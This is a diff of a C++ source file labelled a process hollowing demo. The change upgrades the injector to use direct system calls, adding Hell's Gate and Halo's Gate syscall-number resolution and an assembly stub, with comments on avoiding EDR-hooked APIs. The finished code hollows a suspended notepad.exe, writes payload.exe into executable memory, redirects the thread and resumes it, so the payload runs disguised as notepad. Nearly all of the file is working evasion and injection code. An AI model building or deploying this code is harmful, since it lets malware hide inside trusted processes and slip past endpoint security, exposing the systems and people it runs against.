@@ -1,49 +1,193 @@
-// hollow.cpp
-// Process Hollowing demonstration
-// Reads payload.exe, hollows notepad.exe, injects payload
-
 #include <windows.h>
 #include <winternl.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-// NtUnmapViewOfSection is in ntdll but not in standard headers
-// We load it manually at runtime
-typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);
+// ─────────────────────────────────────────────
+// SSN Resolution (Hell's Gate → Halo's Gate → Fresh Copy)
+// ─────────────────────────────────────────────
+
+DWORD GetSSN_HellsGate(LPCSTR functionName) {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return -1;
+
+    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, functionName);
+    if (!pFunc) return -1;
+
+    if (pFunc[0] == 0xE9) return -1;  // hooked
+
+    if (pFunc[3] == 0xB8)
+        return *(DWORD*)(pFunc + 4);
+
+    return -1;
+}
+
+DWORD GetSSN_HalosGate(LPCSTR functionName) {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, functionName);
+    if (!pFunc) return -1;
+
+    if (pFunc[3] == 0xB8)
+        return *(DWORD*)(pFunc + 4);
+
+    for (int i = 1; i < 10; i++) {
+        BYTE* fwd = pFunc + (i * 32);
+        if (fwd[3] == 0xB8) return *(DWORD*)(fwd + 4) - i;
+
+        BYTE* bwd = pFunc - (i * 32);
+        if (bwd[3] == 0xB8) return *(DWORD*)(bwd + 4) + i;
+    }
+
+    return -1;
+}
+
+DWORD GetSSN_FreshCopy(LPCSTR functionName) {
+    HANDLE hFile = CreateFileA(
+        "C:\\Windows\\System32\\ntdll.dll",
+        GENERIC_READ, FILE_SHARE_READ,
+        NULL, OPEN_EXISTING, 0, NULL
+    );
+    if (hFile == INVALID_HANDLE_VALUE) return -1;
+
+    HANDLE hMapping = CreateFileMappingA(
+        hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL
+    );
+    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMapping;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(
+        (BYTE*)pMapping + pDos->e_lfanew
+    );
+    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
+        (BYTE*)pMapping +
+        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+    );
+
+    DWORD* pNames    = (DWORD*)((BYTE*)pMapping + pExport->AddressOfNames);
+    WORD*  pOrdinals = (WORD*) ((BYTE*)pMapping + pExport->AddressOfNameOrdinals);
+    DWORD* pFuncs    = (DWORD*)((BYTE*)pMapping + pExport->AddressOfFunctions);
+
+    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
+        LPCSTR name = (LPCSTR)((BYTE*)pMapping + pNames[i]);
+        if (strcmp(name, functionName) == 0) {
+            BYTE* pFunc = (BYTE*)pMapping + pFuncs[pOrdinals[i]];
+            if (pFunc[3] == 0xB8) {
+                DWORD ssn = *(DWORD*)(pFunc + 4);
+                UnmapViewOfFile(pMapping);
+                CloseHandle(hMapping);
+                CloseHandle(hFile);
+                return ssn;
+            }
+        }
+    }
+
+    UnmapViewOfFile(pMapping);
+    CloseHandle(hMapping);
+    CloseHandle(hFile);
+    return -1;
+}
+
+DWORD ResolveSSN(LPCSTR functionName) {
+    DWORD ssn = GetSSN_HellsGate(functionName);
+    if (ssn != -1) return ssn;
+
+    ssn = GetSSN_HalosGate(functionName);
+    if (ssn != -1) return ssn;
+
+    return GetSSN_FreshCopy(functionName);
+}
 
 // ─────────────────────────────────────────────
-// Step 0: Read payload.exe from disk into memory
+// Assembly stub — syscall_stub.asm
+// Build with MASM (enable in VS: Build Customizations → masm)
+// ─────────────────────────────────────────────
+// .code
+// DirectSyscall PROC
+//     mov r10, rdx
+//     mov eax, ecx
+//     mov rcx, r8
+//     mov rdx, r9
+//     syscall
+//     ret
+// DirectSyscall ENDP
+// end
+extern "C" NTSTATUS DirectSyscall(DWORD ssn, ...);
+
+// ─────────────────────────────────────────────
+// Syscall wrappers — typed so call sites are clean
+// ─────────────────────────────────────────────
+
+NTSTATUS Syscall_NtGetContextThread(HANDLE hThread, PCONTEXT ctx) {
+    DWORD ssn = ResolveSSN("NtGetContextThread");
+    return DirectSyscall(ssn, hThread, ctx);
+}
+
+NTSTATUS Syscall_NtUnmapViewOfSection(HANDLE hProcess, PVOID baseAddress) {
+    DWORD ssn = ResolveSSN("NtUnmapViewOfSection");
+    return DirectSyscall(ssn, hProcess, baseAddress);
+}
+
+NTSTATUS Syscall_NtAllocateVirtualMemory(
+    HANDLE hProcess,
+    PVOID* baseAddress,
+    ULONG_PTR zeroBits,
+    PSIZE_T regionSize,
+    ULONG allocType,
+    ULONG protect
+) {
+    DWORD ssn = ResolveSSN("NtAllocateVirtualMemory");
+    return DirectSyscall(ssn,
+        hProcess, baseAddress, zeroBits,
+        regionSize, allocType, protect
+    );
+}
+
+NTSTATUS Syscall_NtWriteVirtualMemory(
+    HANDLE hProcess,
+    PVOID baseAddress,
+    PVOID buffer,
+    SIZE_T size,
+    PSIZE_T bytesWritten
+) {
+    DWORD ssn = ResolveSSN("NtWriteVirtualMemory");
+    return DirectSyscall(ssn,
+        hProcess, baseAddress, buffer, size, bytesWritten
+    );
+}
+
+NTSTATUS Syscall_NtSetContextThread(HANDLE hThread, PCONTEXT ctx) {
+    DWORD ssn = ResolveSSN("NtSetContextThread");
+    return DirectSyscall(ssn, hThread, ctx);
+}
+
+NTSTATUS Syscall_NtResumeThread(HANDLE hThread, PULONG suspendCount) {
+    DWORD ssn = ResolveSSN("NtResumeThread");
+    return DirectSyscall(ssn, hThread, suspendCount);
+}
+
+// ─────────────────────────────────────────────
+// Step 0: Read payload.exe from disk — unchanged
 // ─────────────────────────────────────────────
 LPBYTE ReadPayloadFromDisk(const char* path, DWORD* outSize) {
     HANDLE hFile = CreateFileA(
-        path,
-        GENERIC_READ,
-        FILE_SHARE_READ,
-        NULL,
-        OPEN_EXISTING,
-        0,
-        NULL
+        path, GENERIC_READ, FILE_SHARE_READ,
+        NULL, OPEN_EXISTING, 0, NULL
     );
-
     if (hFile == INVALID_HANDLE_VALUE) {
         printf("[-] Cannot open payload file: %d\n", GetLastError());
         return NULL;
     }
-
     *outSize = GetFileSize(hFile, NULL);
     LPBYTE buffer = (LPBYTE)malloc(*outSize);
-
     DWORD bytesRead = 0;
     ReadFile(hFile, buffer, *outSize, &bytesRead, NULL);
     CloseHandle(hFile);
-
     printf("[+] Payload read from disk: %d bytes\n", *outSize);
     return buffer;
 }
 
 // ─────────────────────────────────────────────
-// Relocation processing
-// Needed if payload loads at different base than preferred
+// Relocation processing — unchanged
 // ─────────────────────────────────────────────
 void ApplyRelocations(
     HANDLE hProcess,
@@ -52,10 +196,9 @@ void ApplyRelocations(
     ULONGLONG delta
 ) {
     if (delta == 0) {
-        printf("[+] No relocations needed (loaded at preferred base)\n");
+        printf("[+] No relocations needed\n");
         return;
     }
-
     printf("[*] Applying relocations, delta: 0x%llX\n", delta);
 
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)localPayload;
@@ -65,13 +208,12 @@ void ApplyRelocations(
         nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
     if (relocDir.VirtualAddress == 0) {
-        printf("[*] No relocation table present (fixed binary — good)\n");
+        printf("[*] No relocation table (fixed binary)\n");
         return;
     }
 
     PIMAGE_BASE_RELOCATION reloc =
         (PIMAGE_BASE_RELOCATION)(localPayload + relocDir.VirtualAddress);
-
     DWORD processed = 0;
 
     while (processed < relocDir.Size) {
@@ -80,7 +222,6 @@ void ApplyRelocations(
 
         DWORD numEntries =
             (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-
         PWORD entries =
             (PWORD)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
 
@@ -88,31 +229,20 @@ void ApplyRelocations(
             WORD type   = entries[i] >> 12;
             WORD offset = entries[i] & 0x0FFF;
 
-            // IMAGE_REL_BASED_DIR64 = 10 — x64 absolute address relocation
             if (type == IMAGE_REL_BASED_DIR64) {
                 ULONGLONG remoteAddr =
                     (ULONGLONG)remoteBase + reloc->VirtualAddress + offset;
 
-                // Read current value from remote process
                 ULONGLONG currentValue = 0;
                 ReadProcessMemory(
-                    hProcess,
-                    (LPVOID)remoteAddr,
-                    &currentValue,
-                    sizeof(ULONGLONG),
-                    NULL
+                    hProcess, (LPVOID)remoteAddr,
+                    &currentValue, sizeof(ULONGLONG), NULL
                 );
 
-                // Add delta to fix up the address
                 ULONGLONG newValue = currentValue + delta;
-
-                // Write back to remote process
                 WriteProcessMemory(
-                    hProcess,
-                    (LPVOID)remoteAddr,
-                    &newValue,
-                    sizeof(ULONGLONG),
-                    NULL
+                    hProcess, (LPVOID)remoteAddr,
+                    &newValue, sizeof(ULONGLONG), NULL
                 );
             }
         }
@@ -120,28 +250,27 @@ void ApplyRelocations(
         processed += blockSize;
         reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + blockSize);
     }
-
     printf("[+] Relocations applied\n");
 }
 
 // ─────────────────────────────────────────────
-// Main hollowing logic
+// Main hollowing logic — direct syscall edition
 // ─────────────────────────────────────────────
 int main() {
     printf("╔══════════════════════════════════════╗\n");
     printf("║   JOCKY Process Hollowing Demo       ║\n");
     printf("║   Target: notepad.exe                ║\n");
+    printf("║   Mode:   Direct Syscalls            ║\n");
     printf("╚══════════════════════════════════════╝\n\n");
 
-    // ── 0. Read payload from disk ──────────────────────────────────────
+    // ── 0. Read payload ────────────────────────────────────────────────
     DWORD payloadSize = 0;
     LPBYTE payload = ReadPayloadFromDisk("payload.exe", &payloadSize);
     if (!payload) return 1;
 
-    // Parse PE headers of payload
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
     if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-        printf("[-] payload.exe is not a valid PE file\n");
+        printf("[-] Not a valid PE\n");
         return 1;
     }
 
@@ -149,259 +278,212 @@ int main() {
         (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
 
     if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
-        printf("[-] payload.exe has invalid NT signature\n");
+        printf("[-] Invalid NT signature\n");
         return 1;
     }
 
     printf("[+] Payload PE verified\n");
-    printf("[+] Payload preferred base:  0x%llX\n",
+    printf("[+] Preferred base:  0x%llX\n",
            (ULONGLONG)ntHeaders->OptionalHeader.ImageBase);
-    printf("[+] Payload image size:      0x%X bytes\n",
+    printf("[+] Image size:      0x%X\n",
            ntHeaders->OptionalHeader.SizeOfImage);
-    printf("[+] Payload entry point RVA: 0x%X\n",
+    printf("[+] Entry point RVA: 0x%X\n\n",
            ntHeaders->OptionalHeader.AddressOfEntryPoint);
-    printf("[+] Number of sections:      %d\n\n",
-           ntHeaders->FileHeader.NumberOfSections);
 
-    // ── 1. Launch notepad in SUSPENDED state ──────────────────────────
-    printf("[*] Launching notepad.exe in suspended state...\n");
+    // ── 1. Launch notepad suspended — WinAPI (not a hot EDR target) ───
+    printf("[*] Launching notepad.exe suspended...\n");
 
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
 
-    BOOL created = CreateProcessA(
+    if (!CreateProcessA(
         "C:\\Windows\\System32\\notepad.exe",
-        NULL,   // command line
-        NULL,   // process security attributes
-        NULL,   // thread security attributes
-        FALSE,  // don't inherit handles
-        CREATE_SUSPENDED,  // KEY — frozen at creation, not running
-        NULL,   // use parent's environment
-        NULL,   // use parent's directory
-        &si,
-        &pi
-    );
-
-    if (!created) {
+        NULL, NULL, NULL, FALSE,
+        CREATE_SUSPENDED,
+        NULL, NULL, &si, &pi
+    )) {
         printf("[-] CreateProcess failed: %d\n", GetLastError());
         return 1;
     }
 
-    printf("[+] Notepad launched suspended\n");
-    printf("[+] PID: %d\n", pi.dwProcessId);
-    printf("[+] TID: %d\n\n", pi.dwThreadId);
+    printf("[+] PID: %d | TID: %d\n\n", pi.dwProcessId, pi.dwThreadId);
 
-    // ── 2. Get thread context ──────────────────────────────────────────
-    // Context holds the register state of the suspended main thread
-    // We need it to find PEB and later to redirect execution
-    printf("[*] Reading thread context...\n");
+    // ── 2. Get thread context — DIRECT SYSCALL ─────────────────────────
+    printf("[*] Reading thread context via NtGetContextThread...\n");
 
     CONTEXT ctx = {0};
-    ctx.ContextFlags = CONTEXT_FULL;  // get all registers
+    ctx.ContextFlags = CONTEXT_FULL;
 
-    if (!GetThreadContext(pi.hThread, &ctx)) {
-        printf("[-] GetThreadContext failed: %d\n", GetLastError());
+    NTSTATUS status = Syscall_NtGetContextThread(pi.hThread, &ctx);
+    if (status != 0) {
+        printf("[-] NtGetContextThread failed: 0x%X\n", status);
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
     printf("[+] Thread context obtained\n");
-    printf("[+] Current RIP: 0x%llX\n\n", ctx.Rip);
+    printf("[+] RIP: 0x%llX\n\n", ctx.Rip);
 
-    // ── 3. Find PEB and read notepad's image base ──────────────────────
-    // PEB (Process Environment Block) contains information about the process
-    // including where its executable image is loaded in memory
-    printf("[*] Locating PEB and notepad image base...\n");
+    // ── 3. Find PEB and notepad image base — WinAPI (read only, low risk)
+    printf("[*] Locating PEB...\n");
 
-    // Use NtQueryProcessInformation to get PEB address
-    // This is the most reliable cross-version approach
     typedef NTSTATUS(NTAPI* NtQueryProcessInfo_t)(
-        HANDLE,
-        PROCESSINFOCLASS,
-        PVOID,
-        ULONG,
-        PULONG
+        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG
     );
-
     NtQueryProcessInfo_t NtQPI = (NtQueryProcessInfo_t)GetProcAddress(
-        GetModuleHandleA("ntdll.dll"),
-        "NtQueryInformationProcess"
+        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"
     );
-
-    if (!NtQPI) {
-        printf("[-] Cannot find NtQueryProcessInformation\n");
-        TerminateProcess(pi.hProcess, 1);
-        return 1;
-    }
 
     PROCESS_BASIC_INFORMATION pbi = {0};
     ULONG returnLen = 0;
     NtQPI(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLen);
 
     LPVOID pebAddress = pbi.PebBaseAddress;
-    printf("[+] PEB address: 0x%p\n", pebAddress);
+    printf("[+] PEB: 0x%p\n", pebAddress);
 
-    // Read ImageBase from PEB
-    // On x64, PEB.ImageBaseAddress is at offset 0x10
     LPVOID notepadImageBase = NULL;
     ReadProcessMemory(
         pi.hProcess,
-        (LPBYTE)pebAddress + 0x10,  // ImageBaseAddress field offset
+        (LPBYTE)pebAddress + 0x10,
         &notepadImageBase,
-        sizeof(LPVOID),
-        NULL
+        sizeof(LPVOID), NULL
     );
     printf("[+] Notepad image base: 0x%p\n\n", notepadImageBase);
 
-    // ── 4. Hollow notepad — unmap its executable image ─────────────────
-    printf("[*] Hollowing notepad — unmapping its code...\n");
+    // ── 4. Unmap notepad — DIRECT SYSCALL ─────────────────────────────
+    printf("[*] Unmapping notepad via NtUnmapViewOfSection...\n");
 
-    NtUnmapViewOfSection_t NtUVoS = (NtUnmapViewOfSection_t)GetProcAddress(
-        GetModuleHandleA("ntdll.dll"),
-        "NtUnmapViewOfSection"
-    );
-
-    if (!NtUVoS) {
-        printf("[-] Cannot find NtUnmapViewOfSection\n");
-        TerminateProcess(pi.hProcess, 1);
-        return 1;
-    }
-
-    NTSTATUS status = NtUVoS(pi.hProcess, notepadImageBase);
+    status = Syscall_NtUnmapViewOfSection(pi.hProcess, notepadImageBase);
     if (status != 0) {
         printf("[-] NtUnmapViewOfSection failed: 0x%X\n", status);
-        printf("    notepad's code may be protected\n");
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
+    printf("[+] Notepad unmapped — process is hollow\n\n");
 
-    printf("[+] Notepad code successfully unmapped\n");
-    printf("[+] Process container is now HOLLOW\n\n");
+    // ── 5. Allocate memory — DIRECT SYSCALL ───────────────────────────
+    printf("[*] Allocating via NtAllocateVirtualMemory...\n");
 
-    // ── 5. Allocate memory for our payload ─────────────────────────────
-    printf("[*] Allocating memory for payload at preferred base...\n");
+    PVOID allocBase = (PVOID)ntHeaders->OptionalHeader.ImageBase;
+    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
 
-    // Try to allocate at payload's preferred base address
-    LPVOID allocBase = VirtualAllocEx(
+    status = Syscall_NtAllocateVirtualMemory(
         pi.hProcess,
-        (LPVOID)ntHeaders->OptionalHeader.ImageBase,  // preferred base
-        ntHeaders->OptionalHeader.SizeOfImage,
+        &allocBase,
+        0,
+        &imageSize,
         MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE  // must be executable
+        PAGE_EXECUTE_READWRITE
     );
 
-    if (!allocBase) {
-        // Preferred base not available (ASLR) — let OS choose
-        printf("[*] Preferred base unavailable, using OS-assigned base\n");
-        allocBase = VirtualAllocEx(
+    if (status != 0) {
+        // Preferred base unavailable — let OS choose
+        printf("[*] Preferred base busy, letting OS assign...\n");
+        allocBase = NULL;
+        imageSize = ntHeaders->OptionalHeader.SizeOfImage;
+
+        status = Syscall_NtAllocateVirtualMemory(
             pi.hProcess,
-            NULL,
-            ntHeaders->OptionalHeader.SizeOfImage,
+            &allocBase,
+            0,
+            &imageSize,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE
         );
     }
 
-    if (!allocBase) {
-        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
+    if (status != 0) {
+        printf("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
+    printf("[+] Allocated at: 0x%p\n\n", allocBase);
 
-    printf("[+] Memory allocated at: 0x%p\n\n", allocBase);
+    // ── 6. Write PE headers — DIRECT SYSCALL ──────────────────────────
+    printf("[*] Writing payload via NtWriteVirtualMemory...\n");
 
-    // ── 6. Write payload PE headers ────────────────────────────────────
-    printf("[*] Writing payload into hollow process...\n");
+    SIZE_T bytesWritten = 0;
 
-    WriteProcessMemory(
+    status = Syscall_NtWriteVirtualMemory(
         pi.hProcess,
         allocBase,
         payload,
         ntHeaders->OptionalHeader.SizeOfHeaders,
-        NULL
+        &bytesWritten
     );
-    printf("[+] PE headers written\n");
+    printf("[+] PE headers written (%llu bytes)\n", bytesWritten);
 
-    // ── 7. Write each section ──────────────────────────────────────────
+    // ── 7. Write sections — DIRECT SYSCALL ────────────────────────────
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
 
     for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-        // Skip empty sections
-        if (section->SizeOfRawData == 0) {
-            section++;
-            continue;
-        }
+        if (section->SizeOfRawData == 0) { section++; continue; }
 
-        LPVOID sectionDest = (LPBYTE)allocBase + section->VirtualAddress;
+        PVOID dest = (PBYTE)allocBase + section->VirtualAddress;
 
-        WriteProcessMemory(
+        status = Syscall_NtWriteVirtualMemory(
             pi.hProcess,
-            sectionDest,
+            dest,
             payload + section->PointerToRawData,
             section->SizeOfRawData,
-            NULL
+            &bytesWritten
         );
 
-        printf("[+] Section written: %-8.8s | RVA: 0x%08X | Size: 0x%X\n",
-               section->Name,
-               section->VirtualAddress,
-               section->SizeOfRawData);
+        printf("[+] Section %-8.8s | RVA: 0x%08X | %llu bytes written\n",
+               section->Name, section->VirtualAddress, bytesWritten);
 
         section++;
     }
 
-    // ── 8. Apply relocations if base address changed ───────────────────
+    // ── 8. Apply relocations — unchanged ──────────────────────────────
     ULONGLONG delta =
         (ULONGLONG)allocBase - ntHeaders->OptionalHeader.ImageBase;
-
     ApplyRelocations(pi.hProcess, payload, allocBase, delta);
 
-    // ── 9. Update PEB ImageBase to our payload ─────────────────────────
+    // ── 9. Update PEB ImageBase — WinAPI write (low risk) ─────────────
     WriteProcessMemory(
         pi.hProcess,
         (LPBYTE)pebAddress + 0x10,
         &allocBase,
-        sizeof(LPVOID),
-        NULL
+        sizeof(PVOID), NULL
     );
     printf("[+] PEB ImageBase updated\n");
 
-    // ── 10. Redirect execution to our payload entry point ──────────────
-    printf("\n[*] Redirecting execution to payload entry point...\n");
+    // ── 10. Redirect execution — DIRECT SYSCALL ───────────────────────
+    printf("\n[*] Redirecting RCX to payload entry via NtSetContextThread...\n");
 
-    ULONGLONG newEntryPoint =
+    ULONGLONG newEntry =
         (ULONGLONG)allocBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 
-    // On x64, when a process is freshly created and suspended,
-    // RCX holds the entry point address (the loader calls it via RCX)
-    ctx.Rcx = newEntryPoint;
+    ctx.Rcx = newEntry;
 
-    if (!SetThreadContext(pi.hThread, &ctx)) {
-        printf("[-] SetThreadContext failed: %d\n", GetLastError());
+    status = Syscall_NtSetContextThread(pi.hThread, &ctx);
+    if (status != 0) {
+        printf("[-] NtSetContextThread failed: 0x%X\n", status);
+        TerminateProcess(pi.hProcess, 1);
+        return 1;
+    }
+    printf("[+] Entry point set: 0x%llX\n", newEntry);
+
+    // ── 11. Resume — DIRECT SYSCALL ───────────────────────────────────
+    printf("\n[*] Resuming via NtResumeThread...\n");
+
+    ULONG suspendCount = 0;
+    status = Syscall_NtResumeThread(pi.hThread, &suspendCount);
+    if (status != 0) {
+        printf("[-] NtResumeThread failed: 0x%X\n", status);
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
 
-    printf("[+] Entry point set to: 0x%llX\n", newEntryPoint);
-
-    // ── 11. Resume — payload executes inside notepad ───────────────────
-    printf("\n[*] Resuming thread...\n");
-    ResumeThread(pi.hThread);
-
     printf("\n╔══════════════════════════════════════════════════╗\n");
-    printf("║  HOLLOWING COMPLETE                              ║\n");
-    printf("║                                                  ║\n");
-    printf("║  Payload is running inside notepad.exe           ║\n");
+    printf("║  HOLLOWING COMPLETE — Direct Syscall Edition     ║\n");
+    printf("║  JOCKY payload running inside notepad.exe        ║\n");
     printf("║  PID: %-5d                                      ║\n", pi.dwProcessId);
-    printf("║                                                  ║\n");
-    printf("║  Check Task Manager — you see notepad            ║\n");
-    printf("║  But JOCKY's code is what's executing inside     ║\n");
     printf("╚══════════════════════════════════════════════════╝\n");
 
-    // Clean up handles
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     free(payload);
-
     return 0;
 }
